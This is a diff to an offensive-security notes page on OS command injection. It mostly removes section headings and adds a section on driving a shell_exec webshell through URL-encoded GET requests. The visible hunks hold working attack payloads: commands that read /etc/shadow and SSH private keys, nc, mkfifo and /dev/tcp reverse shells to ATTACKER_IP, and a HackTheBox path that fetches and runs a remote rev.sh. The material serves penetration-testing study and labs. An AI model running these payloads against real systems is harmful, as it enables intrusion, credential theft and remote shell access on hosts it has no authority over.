@@ -36,8 +36,6 @@ Output reveals the server runs as a specific OS user.
 - Input is not sanitised to remove or escape shell metacharacters
 - Web server process has sufficient OS privileges to execute commands
 
-## Methodology
-
 ### 1. Identify candidate injection points
 
 Look for features that suggest OS command execution:
@@ -144,8 +142,6 @@ cat /etc/shadow
 cat /home/user/.ssh/id_rsa
 ```
 
-## Key payloads / examples
-
 ### Command separator reference
 
 | Separator | Behaviour | Supported on |
@@ -199,8 +195,6 @@ productID=1%26whoami%26
 & nc ATTACKER_IP 4444 -e /bin/bash &
 & mkfifo /tmp/f;nc ATTACKER_IP 4444 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f &
 ```
-
-## Bypasses and variants
 
 ### Spaces are blocked
 
@@ -411,8 +405,6 @@ An attacker with the ability to push to the repository could re-upload a modifie
 
 **Takeaway:** CI cache artifacts are executable trust boundaries. Treat cache restore steps with the same security rigour as code execution, use cryptographic integrity checks on cache artifacts, and never mix high-privilege secret injection with mutable cache layers.
 
-## From the Wild
-
 ### HTB — CozyHosting (2023)
 - **Technique variant**: Space filter + trailing argument bypass in Spring Boot
 - **Attack path**: `/executessh` passes `username` to an SSH command; spaces blocked; bypass with `${IFS}` for spaces and `#` to drop trailing SSH flags: `0xdf;curl${IFS}http://ATTACKER/rev.sh${IFS}-o${IFS}/tmp/rev.sh#` then `0xdf;bash${IFS}/tmp/rev.sh#`
@@ -516,8 +508,6 @@ done
 nohup sleep 120 > /dev/null &
 nohup bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1' > /dev/null &
 ```
-
-## PortSwigger Labs
 
 ### Lab 1 — OS command injection, simple case (Apprentice)
 
@@ -678,3 +668,15 @@ validation sibling of this bug (a missing trailing `$`/`.fullmatch`).
 <!-- promoted-slug: prefix-allowlist-command-chain -->
 
 > Full server-side git-integration attack surface (`.git/config` directives, hooks, buried bare repos, symlink checkout escape, `--pathspec-from-file` arg injection, npm-symlink `.git` blacklist bypass): [[git-integration-exploitation]].
+
+## Driving a shell_exec webshell over GET
+
+Once a `shell_exec($_GET[...])` webshell exists, stdout arrives but errors do not: `shell_exec` swallows stderr, so append `2>&1` (encoded `2%3E%261`) to any command whose failures matter. URL-encode every metacharacter because the command rides a GET parameter: space `%20`, `/` `%2F`, `\` `%5C`, `&` `%26`, `"` `%22`, `(` `%28`, `)` `%29`.
+
+```sh
+curl -s "http://<host>/index.php?c=whoami%202%3E%261"
+```
+
+A 200 with empty body usually means stderr was eaten or an unencoded metacharacter broke the URL, not that the command failed to run.
+
+<!-- promoted-slug: webshell-shell-exec-driving -->
